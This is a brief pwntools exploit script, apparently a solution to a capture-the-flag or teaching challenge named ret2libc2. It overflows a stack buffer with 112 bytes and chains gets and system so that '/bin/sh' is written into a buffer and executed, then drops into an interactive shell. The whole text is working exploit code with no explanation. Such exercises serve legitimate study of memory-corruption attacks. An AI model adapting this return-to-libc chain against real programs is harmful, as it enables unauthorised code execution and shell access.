from pwn import *

sh = process('./ret2libc2')

buf2 = 0x804a080
gets = 0x08048460
system = 0x08048490
sh.sendline(b'a' * 112 + p32(gets) + p32(system) + p32(buf2) + p32(buf2))
sh.sendline(b'/bin/sh')
sh.interactive()